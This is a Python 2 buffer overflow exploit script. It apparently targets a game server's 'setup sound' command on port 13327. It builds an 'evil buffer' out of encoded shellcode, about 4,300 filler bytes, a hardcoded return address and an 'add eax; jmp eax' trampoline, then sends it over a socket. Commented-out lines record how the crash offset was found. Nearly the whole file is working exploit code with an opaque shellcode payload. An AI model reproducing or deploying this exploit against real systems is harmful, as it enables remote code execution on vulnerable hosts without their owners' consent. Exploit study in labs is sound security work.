#!/usr/bin/python
import socket
host = "127.0.0.1"
# nasm > add eax, 12
# 00000000  83C00C            add eax,byte +0xc
# nasm > jmp eax
# 00000000  FFE0              jmp eax

shell=("\xd9\xcd\xd9\x74\x24\xf4\x5e\x29\xc9\xbf\xda\x18\x27\x30\xb1"
"\x14\x31\x7e\x19\x03\x7e\x19\x83\xc6\x04\x38\xed\x16\xeb\x4b"
"\xed\x0a\x48\xe0\x98\xae\xc7\xe7\xed\xc9\x1a\x67\x56\x48\xf7"
"\x0f\x6b\x74\xe6\x93\x01\x64\x59\x7b\x5f\x65\x33\x1d\x07\xab"
"\x44\x68\xf6\x37\xf6\x6e\x49\x51\x35\xee\xea\x2e\xa3\x23\x6c"
"\xdd\x75\xd1\x52\xba\x48\xa5\xe4\x43\xab\xcd\xd9\x9c\x38\x65"
"\x4e\xcc\xdc\x1c\xe0\x9b\xc2\x8e\xaf\x12\xe5\x9e\x5b\xe8\x66")

#crash="\x41" * 4379
#crash="\x41" * 4368 + "\x42"*4 + "C"*7
#crash="\x41" * 4368 + "\x96\x45\x13\x08" + "\x83\xC0\x0C\xFF\xE0" + "\x90"*2
crash=shell + "\x41" * (4368 - 105) + "\x96\x45\x13\x08" + "\x83\xC0\x0C\xFF\xE0" + "\x90"*2
#crash="\x41" * 4368 + "\x42" * 4 + "\x83\xC0\x0C\xFE\xE0" + "\x90"*2
buffer = "\x11(setup sound " + crash + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent !"
